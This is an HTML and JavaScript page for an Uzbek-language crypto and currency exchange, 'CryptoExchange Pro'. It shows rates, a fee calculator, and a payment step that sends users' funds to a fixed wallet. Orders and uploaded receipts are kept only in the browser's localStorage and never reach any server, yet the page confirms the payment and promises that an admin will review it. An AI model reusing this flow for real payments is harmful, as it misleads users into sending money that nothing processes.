<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>CryptoExchange Pro - Valyuta Almashtirish</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --bg-dark: #0f172a;
            --bg-card: #1e293b;
            --bg-light: #334155;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --gradient-1: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            --shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-dark);
            color: var(--text-primary);
            min-height: 100vh;
        }
        .ticker-container {
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(99, 102, 241, 0.3);
            padding: 12px 0;
            overflow: hidden;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .ticker-wrap {
            display: flex;
            animation: ticker 35s linear infinite;
            white-space: nowrap;
        }
        .ticker-item { display: inline-flex; align-items: center; padding: 0 25px; font-size: 14px; font-weight: 600; }
        .ticker-item .coin { color: var(--primary); margin-right: 8px; }
        .ticker-item .price { color: var(--success); margin-left: 5px; }
        @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
        .header { text-align: center; padding: 30px 20px 20px; }
        .header h1 { font-size: 2rem; background: var(--gradient-1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .history-btn {
            position: fixed; top: 80px; right: 20px;
            background: var(--bg-card); border: 1px solid var(--primary);
            color: var(--primary); padding: 10px 18px; border-radius: 25px;
            cursor: pointer; z-index: 500; font-weight: 600;
        }
        .container {
            max-width: 1200px; margin: 0 auto; padding: 20px;
            display: grid; grid-template-columns: 1fr 1fr; gap: 30px;
        }
        @media (max-width: 968px) { .container { grid-template-columns: 1fr; } }
        .exchange-panel, .rates-panel {
            background: var(--bg-card); border-radius: 20px; padding: 30px;
            border: 1px solid rgba(99,102,241,0.2); box-shadow: var(--shadow);
        }
        .exchange-panel h2, .rates-panel h2 { font-size: 1.3rem; margin-bottom: 20px; }
        .currency-select, .amount-input, .wallet-input { margin-bottom: 20px; }
        .currency-select label, .amount-input label, .wallet-input label {
            display: block; margin-bottom: 8px; color: var(--text-secondary); font-size: 0.9rem;
        }
        .select-wrapper, .input-wrapper {
            background: var(--bg-light); border-radius: 12px; border: 2px solid transparent;
            transition: all 0.3s;
        }
        .select-wrapper:focus-within, .input-wrapper:focus-within { border-color: var(--primary); }
        .select-wrapper select {
            width: 100%; padding: 15px; background: transparent; border: none;
            color: var(--text-primary); font-size: 1rem; cursor: pointer; outline: none;
        }
        .input-wrapper { display: flex; align-items: center; }
        .input-wrapper input {
            flex: 1; padding: 15px; background: transparent; border: none;
            color: var(--text-primary); font-size: 1.1rem; font-weight: 600; outline: none;
        }
        .input-currency { padding: 10px 15px; background: rgba(99,102,241,0.2); border-radius: 8px; margin-right: 10px; font-weight: 600; }
        .wallet-input input {
            width: 100%; padding: 15px; background: var(--bg-light); border-radius: 12px;
            color: var(--text-primary); outline: none; border: 2px solid transparent;
        }
        .wallet-input input:focus { border-color: var(--primary); }
        .swap-btn { display: flex; justify-content: center; margin: 20px 0; }
        .swap-btn button {
            width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--primary);
            background: var(--bg-card); color: var(--primary); font-size: 1.5rem; cursor: pointer;
            transition: all 0.3s;
        }
        .result-display {
            background: var(--gradient-1); border-radius: 16px; padding: 25px; margin: 20px 0; text-align: center;
        }
        .result-amount { font-size: 2rem; font-weight: 700; }
        .exchange-btn {
            width: 100%; padding: 16px; border-radius: 12px; border: none;
            background: var(--gradient-1); color: white; font-size: 1.1rem;
            font-weight: 700; cursor: pointer; margin-top: 20px;
        }
        .rate-card {
            background: rgba(255,255,255,0.05); border-radius: 12px; padding: 15px; margin-bottom: 12px;
            display: flex; justify-content: space-between; align-items: center;
            transition: all 0.3s; border: 1px solid transparent;
        }
        .rate-card:hover { background: rgba(99,102,241,0.2); transform: translateX(5px); border-color: var(--primary); }
        .rate-info { display: flex; align-items: center; gap: 12px; }
        .rate-icon {
            width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center;
            justify-content: center; font-weight: bold; font-size: 1.1rem;
        }
        .icon-btc { background: #f7931a; }
        .icon-eth { background: #627eea; }
        .icon-usdt { background: #26a17b; }
        .icon-ton { background: #0088cc; }
        .icon-trx { background: #ff060a; }
        .icon-doge { background: #c2a633; }
        .icon-usdc { background: #2775ca; }
        .icon-uzs { background: #1eb53a; }
        .icon-usd { background: #85bb65; }
        .icon-rub { background: #0033a0; }
        .rate-price { font-weight: 700; font-size: 1.1rem; color: var(--success); }
        .modal-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 1000;
            justify-content: center; align-items: center;
        }
        .modal-overlay.active { display: flex; }
        .modal {
            background: var(--bg-card); border-radius: 24px; padding: 30px;
            max-width: 550px; width: 90%; max-height: 90vh; overflow-y: auto;
        }
        .payment-detail-row {
            display: flex; justify-content: space-between; padding: 12px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .copy-btn {
            background: rgba(99,102,241,0.2); border: none; color: var(--primary);
            padding: 5px 12px; border-radius: 6px; cursor: pointer; margin-left: 10px;
        }
        .upload-area {
            border: 2px dashed var(--bg-light); border-radius: 12px; padding: 20px;
            text-align: center; cursor: pointer; margin: 20px 0;
        }
        .timer-display { text-align: center; font-size: 2.5rem; font-family: monospace; color: var(--warning); margin: 20px 0; }
        .modal-buttons { display: flex; gap: 15px; margin-top: 20px; }
        .save-btn { background: var(--success); color: white; padding: 12px; border: none; border-radius: 10px; cursor: pointer; flex: 1; font-weight: bold; }
        .cancel-btn { background: var(--danger); color: white; padding: 12px; border: none; border-radius: 10px; cursor: pointer; flex: 1; font-weight: bold; }
        .contact-info {
            background: rgba(99,102,241,0.1); border-radius: 12px; padding: 15px;
            margin-top: 15px; border: 1px solid rgba(99,102,241,0.3);
        }
        .toast {
            position: fixed; bottom: 30px; right: 30px; background: var(--bg-card);
            border-radius: 12px; padding: 15px 20px; transform: translateX(400px);
            transition: all 0.3s; z-index: 3000; border-left: 4px solid var(--success);
        }
        .toast.active { transform: translateX(0); }
    </style>
</head>
<body>
    <div class="ticker-container">
        <div class="ticker-wrap" id="tickerWrap"></div>
    </div>

    <button class="history-btn" onclick="openHistoryModal()">📜 Tarix</button>

    <div class="header">
        <h1>💱 CryptoExchange Pro</h1>
        <p>Valyuta va kripto almashtirish</p>
    </div>

    <div class="container">
        <div class="exchange-panel">
            <h2>💱 Almashtirish</h2>
            <div class="currency-select">
                <label>Siz berasiz:</label>
                <div class="select-wrapper">
                    <select id="giveCurrency" onchange="updateCalculation()">
                        <option value="UZS">🇺🇿 UZS - So'm</option>
                        <option value="USD">🇺🇸 USD - Dollar</option>
                        <option value="RUB">🇷🇺 RUB - Ruble</option>
                        <option value="USDT">₮ USDT - Tether</option>
                        <option value="BTC">₿ Bitcoin</option>
                        <option value="ETH">Ξ Ethereum</option>
                        <option value="TON">🌐 TON</option>
                        <option value="TRX">📱 TRX</option>
                        <option value="DOGE">🐕 DOGE</option>
                        <option value="USDC">💰 USDC</option>
                    </select>
                </div>
            </div>
            <div class="amount-input">
                <label>Miqdor:</label>
                <div class="input-wrapper">
                    <input type="number" id="giveAmount" placeholder="0.00" oninput="updateCalculation()">
                    <span class="input-currency" id="giveSymbol">UZS</span>
                </div>
            </div>
            <div class="swap-btn">
                <button onclick="swapCurrencies()">⇅</button>
            </div>
            <div class="currency-select">
                <label>Siz olasiz:</label>
                <div class="select-wrapper">
                    <select id="getCurrency" onchange="updateCalculation()">
                        <option value="USDT">₮ USDT</option>
                        <option value="BTC">₿ BTC</option>
                        <option value="ETH">Ξ ETH</option>
                        <option value="TON">🌐 TON</option>
                        <option value="TRX">📱 TRX</option>
                        <option value="DOGE">🐕 DOGE</option>
                        <option value="USDC">💰 USDC</option>
                        <option value="UZS">🇺🇿 UZS</option>
                        <option value="USD">🇺🇸 USD</option>
                        <option value="RUB">🇷🇺 RUB</option>
                    </select>
                </div>
            </div>
            <div class="result-display">
                <div class="result-amount" id="resultAmount">0.00</div>
                <div id="resultRate" style="font-size: 0.85rem;">Kurs: -</div>
            </div>
            <div class="wallet-input">
                <label>💰 Sizning hamyoningiz (qabul qilish uchun):</label>
                <input type="text" id="userWallet" placeholder="Sizning wallet yoki karta raqamingiz">
            </div>
            <button class="exchange-btn" onclick="openExchangeModal()">🚀 Almashtirish</button>
        </div>

        <div class="rates-panel">
            <h2>📊 Valyuta kurslari</h2>
            <div id="ratesList">Yuklanmoqda...</div>
        </div>
    </div>

    <!-- Payment Modal -->
    <div class="modal-overlay" id="paymentModal">
        <div class="modal">
            <div id="paymentContent"></div>
            <div class="modal-buttons" id="paymentButtons">
                <button class="cancel-btn" onclick="closePaymentModal()">🔒 Yopish</button>
            </div>
        </div>
    </div>

    <!-- History Modal -->
    <div class="modal-overlay" id="historyModal">
        <div class="modal" style="max-width: 700px;">
            <h3>📜 Tranzaksiya tarixi</h3>
            <div id="historyList"></div>
            <button class="cancel-btn" onclick="closeHistoryModal()" style="margin-top: 20px;">Yopish</button>
        </div>
    </div>

    <div class="toast" id="toast">✅ Muvaffaqiyatli</div>

    <script>
        let rates = {};
        let receiverWallets = {};
        let contactInfo = {};
        let allCurrencies = ['BTC', 'ETH', 'USDT', 'TON', 'TRX', 'DOGE', 'USDC', 'UZS', 'USD', 'RUB'];
        let currencyIcons = { BTC:'₿', ETH:'Ξ', USDT:'₮', TON:'🌐', TRX:'📱', DOGE:'🐕', USDC:'💰', UZS:'🇺🇿', USD:'🇺🇸', RUB:'🇷🇺' };
        let currencyNames = { BTC:'Bitcoin', ETH:'Ethereum', USDT:'Tether', TON:'TON', TRX:'Tron', DOGE:'Dogecoin', USDC:'USD Coin', UZS:'So\'m', USD:'Dollar', RUB:'Ruble' };
        
        let orders = JSON.parse(localStorage.getItem('orders') || '[]');
        let currentOrder = null;
        let paymentTimerInterval = null;
        let statusCheckInterval = null;

        // Load JSON data
        async function loadData() {
            try {
                const ratesRes = await fetch('rates.json');
                rates = await ratesRes.json();
                
                const walletsRes = await fetch('wallets.json');
                receiverWallets = await walletsRes.json();
                
                const contactsRes = await fetch('contacts.json');
                contactInfo = await contactsRes.json();
                
                updateTicker();
                renderRatesList();
                updateCalculation();
            } catch(e) {
                console.error('Ma\'lumot yuklanmadi:', e);
                showToast('⚠️ Kurslar yuklanmadi, internetni tekshiring');
            }
        }

        function updateTicker() {
            const wrap = document.getElementById('tickerWrap');
            let html = '';
            allCurrencies.forEach(curr => {
                if(rates[curr]) {
                    const price = (1 / rates[curr]).toFixed(curr === 'BTC' || curr === 'ETH' ? 8 : 2);
                    html += `<div class="ticker-item"><span class="coin">${currencyIcons[curr]} ${curr}</span><span class="price">$${price}</span></div>`;
                }
            });
            wrap.innerHTML = html + html;
        }

        function renderRatesList() {
            const container = document.getElementById('ratesList');
            container.innerHTML = allCurrencies.filter(c => rates[c]).map(curr => {
                const price = (1 / rates[curr]).toFixed(curr === 'BTC' || curr === 'ETH' ? 8 : 2);
                return `<div class="rate-card">
                    <div class="rate-info"><div class="rate-icon icon-${curr.toLowerCase()}">${currencyIcons[curr]}</div>
                    <div><div class="rate-name">${curr}</div><div class="rate-fullname">${currencyNames[curr]}</div></div></div>
                    <div class="rate-value"><div class="rate-price">$${price}</div></div>
                </div>`;
            }).join('');
        }

        function updateCalculation() {
            const giveCurr = document.getElementById('giveCurrency').value;
            const getCurr = document.getElementById('getCurrency').value;
            let giveAmount = parseFloat(document.getElementById('giveAmount').value) || 0;
            document.getElementById('giveSymbol').innerText = giveCurr;
            
            if(rates[giveCurr] && rates[getCurr]) {
                const rate = rates[getCurr] / rates[giveCurr];
                const fee = 0.005;
                const getAmount = giveAmount * rate * (1 - fee);
                document.getElementById('resultAmount').innerHTML = getAmount.toFixed(getCurr === 'UZS' ? 0 : 6) + ' ' + getCurr;
                document.getElementById('resultRate').innerHTML = `1 ${giveCurr} = ${rate.toFixed(6)} ${getCurr} (komissiya 0.5%)`;
            }
        }

        function swapCurrencies() {
            const give = document.getElementById('giveCurrency').value;
            const get = document.getElementById('getCurrency').value;
            document.getElementById('giveCurrency').value = get;
            document.getElementById('getCurrency').value = give;
            updateCalculation();
        }

        function openExchangeModal() {
            const giveAmount = parseFloat(document.getElementById('giveAmount').value);
            if (!giveAmount || giveAmount <= 0) { showToast('❌ Miqdor kiriting'); return; }
            const userWallet = document.getElementById('userWallet').value;
            if (!userWallet.trim()) { showToast('❌ Sizning hamyoningizni kiriting'); return; }

            const giveCurr = document.getElementById('giveCurrency').value;
            const getCurr = document.getElementById('getCurrency').value;
            const getAmount = parseFloat(document.getElementById('resultAmount').innerText.split(' ')[0]);
            
            const txId = 'TX' + Date.now() + Math.floor(Math.random() * 1000);
            
            currentOrder = {
                id: txId, giveCurrency: giveCurr, getCurrency: getCurr,
                giveAmount: giveAmount, getAmount: getAmount, userWallet: userWallet,
                receiverWallet: receiverWallets[giveCurr], status: 'pending',
                createdAt: new Date().toISOString(), receiptData: null, receiptName: null
            };

            showPaymentScreen('initial');
        }

        function showPaymentScreen(screen) {
            const modal = document.getElementById('paymentModal');
            const content = document.getElementById('paymentContent');
            const buttons = document.getElementById('paymentButtons');
            
            if (screen === 'initial') {
                content.innerHTML = `
                    <h3>💸 To'lov ma'lumotlari</h3>
                    <div class="payment-detail-row"><span>📋 ID:</span><span><strong>${currentOrder.id}</strong> <button class="copy-btn" onclick="copyText('${currentOrder.id}')">📋</button></span></div>
                    <div class="payment-detail-row"><span>💰 Siz yuborasiz:</span><span>${currentOrder.giveAmount} ${currentOrder.giveCurrency}</span></div>
                    <div class="payment-detail-row"><span>💎 Siz olasiz:</span><span>${currentOrder.getAmount.toFixed(6)} ${currentOrder.getCurrency}</span></div>
                    <div class="payment-detail-row"><span>🏦 Bizning hamyon:</span><span><strong>${currentOrder.receiverWallet}</strong> <button class="copy-btn" onclick="copyText('${currentOrder.receiverWallet}')">📋</button></span></div>
                    <div class="contact-info"><h4>📞 Murojat:</h4><div>📞 ${contactInfo.phone || '-'}</div><div>📧 ${contactInfo.email || '-'}</div><div>📱 ${contactInfo.telegram || '-'}</div></div>
                    <div class="timer-display" id="paymentTimer">15:00</div>
                    <div class="upload-area" onclick="document.getElementById('receiptFileInput').click()">
                        📁 Kvitansiya yuklang (PDF/JPG/PNG)
                        <input type="file" id="receiptFileInput" accept=".pdf,.jpg,.jpeg,.png" style="display:none" onchange="handleReceiptUpload(this)">
                    </div>
                    <div id="receiptStatus" style="margin: 10px 0;"></div>
                `;
                buttons.innerHTML = `<button class="save-btn" onclick="confirmPaymentSent()">✅ To'lov qildim</button>
                                    <button class="cancel-btn" onclick="closePaymentModal()">❌ Bekor</button>`;
                modal.classList.add('active');
                startPaymentTimer(900);
            } else if (screen === 'waiting') {
                if (paymentTimerInterval) clearInterval(paymentTimerInterval);
                content.innerHTML = `<h3>⏳ To'lovingiz qabul qilindi!</h3>
                    <div class="payment-detail-row"><span>📋 ID:</span><span>${currentOrder.id}</span></div>
                    <div class="contact-info"><h4>⏰ Aktivlaringiz yuborilgunga kuting!</h4>
                    <p>Agar 15 daqiqada kelmasa, murojat qiling:</p>
                    <div>📞 ${contactInfo.phone || '-'}</div><div>📧 ${contactInfo.email || '-'}</div>
                    <div>📱 ${contactInfo.telegram || '-'}</div></div>
                    <div id="orderStatusMsg" style="text-align:center;padding:15px;background:rgba(99,102,241,0.1);border-radius:12px;">⏳ Admin tekshirmoqda...</div>`;
                buttons.innerHTML = `<button class="cancel-btn" onclick="closePaymentModal()">🔒 Yopish</button>`;
                startStatusCheck();
            } else if (screen === 'sent') {
                if (statusCheckInterval) clearInterval(statusCheckInterval);
                content.innerHTML = `<h3>✅ Aktivlaringiz yuborildi!</h3>
                    <div class="payment-detail-row"><span>📋 ID:</span><span>${currentOrder.id}</span></div>
                    <div class="contact-info" style="background:rgba(16,185,129,0.1);border-color:var(--success);">
                    <h4>🎉 Tranzaksiya muvaffaqiyatli!</h4><p>Pul sizning hamyoningizga yuborildi.</p></div>`;
                buttons.innerHTML = `<button class="cancel-btn" onclick="closePaymentModal()">🔒 Yopish</button>`;
            }
        }

        function startPaymentTimer(seconds) {
            let remaining = seconds;
            const timerDisplay = document.getElementById('paymentTimer');
            if (paymentTimerInterval) clearInterval(paymentTimerInterval);
            paymentTimerInterval = setInterval(() => {
                if (timerDisplay) {
                    const mins = Math.floor(remaining / 60);
                    const secs = remaining % 60;
                    timerDisplay.innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
                }
                if (remaining <= 0) {
                    clearInterval(paymentTimerInterval);
                    if (currentOrder && currentOrder.status === 'pending') {
                        currentOrder.status = 'cancelled';
                        orders.push(currentOrder);
                        localStorage.setItem('orders', JSON.stringify(orders));
                        showToast('⏰ Vaqt tugadi!');
                        closePaymentModal();
                    }
                }
                remaining--;
            }, 1000);
        }

        function startStatusCheck() {
            if (statusCheckInterval) clearInterval(statusCheckInterval);
            statusCheckInterval = setInterval(() => {
                const updatedOrder = orders.find(o => o.id === currentOrder?.id);
                if (updatedOrder && updatedOrder.status === 'sent' && currentOrder?.status !== 'sent') {
                    currentOrder = updatedOrder;
                    showPaymentScreen('sent');
                    clearInterval(statusCheckInterval);
                }
            }, 3000);
        }

        function handleReceiptUpload(input) {
            const file = input.files[0];
            if (!file) return;
            if (file.size > 10 * 1024 * 1024) { showToast('❌ Fayl 10MB dan katta'); return; }
            const reader = new FileReader();
            reader.onload = function(e) {
                if (currentOrder) { currentOrder.receiptData = e.target.result; currentOrder.receiptName = file.name; }
                document.getElementById('receiptStatus').innerHTML = `✅ ${file.name} yuklandi`;
            };
            reader.readAsDataURL(file);
        }

        function confirmPaymentSent() {
            if (!currentOrder || !currentOrder.receiptData) { showToast('❌ Kvitansiyani yuklang'); return; }
            if (currentOrder.status !== 'pending') { showToast('⚠️ Zakaz tasdiqlangan'); return; }
            currentOrder.status = 'paid';
            currentOrder.paidAt = new Date().toISOString();
            orders.push(currentOrder);
            localStorage.setItem('orders', JSON.stringify(orders));
            clearInterval(paymentTimerInterval);
            showPaymentScreen('waiting');
            showToast('✅ To\'lovingiz qabul qilindi!');
            document.getElementById('receiptFileInput').value = '';
        }

        function closePaymentModal() {
            document.getElementById('paymentModal').classList.remove('active');
            if (paymentTimerInterval) clearInterval(paymentTimerInterval);
            if (statusCheckInterval) clearInterval(statusCheckInterval);
        }

        function openHistoryModal() {
            const container = document.getElementById('historyList');
            if (orders.length === 0) { container.innerHTML = '<p>Tarix yo\'q</p>'; }
            else {
                container.innerHTML = orders.slice().reverse().map(order => `
                    <div style="background:rgba(255,255,255,0.05);border-radius:12px;padding:15px;margin-bottom:12px;">
                        <div><strong>${order.id}</strong> <span style="display:inline-block;padding:2px 10px;border-radius:20px;font-size:12px;background:${order.status==='sent'?'rgba(16,185,129,0.2)':'rgba(245,158,11,0.2)'};color:${order.status==='sent'?'#10b981':'#f59e0b'}">${order.status==='sent'?'✅ Yuborilgan':order.status==='paid'?'⏳ Kutilmoqda':order.status==='pending'?'⏳ To\'lov kutilmoqda':'❌ Bekor'}</span></div>
                        <div>Berish: ${order.giveAmount} ${order.giveCurrency}</div>
                        <div>Olish: ${order.getAmount} ${order.getCurrency}</div>
                        <div>Sana: ${new Date(order.createdAt).toLocaleString()}</div>
                        ${order.status === 'sent' ? '<div style="color:var(--success);">💰 Aktivlaringiz yuborildi!</div>' : ''}
                    </div>
                `).join('');
            }
            document.getElementById('historyModal').classList.add('active');
        }

        function closeHistoryModal() { document.getElementById('historyModal').classList.remove('active'); }
        function copyText(text) { navigator.clipboard.writeText(text); showToast('✅ Nusxa olindi'); }
        function showToast(msg) { const toast = document.getElementById('toast'); toast.innerText = msg; toast.classList.add('active'); setTimeout(() => toast.classList.remove('active'), 2500); }

        loadData();
    </script>
</body>
</html>
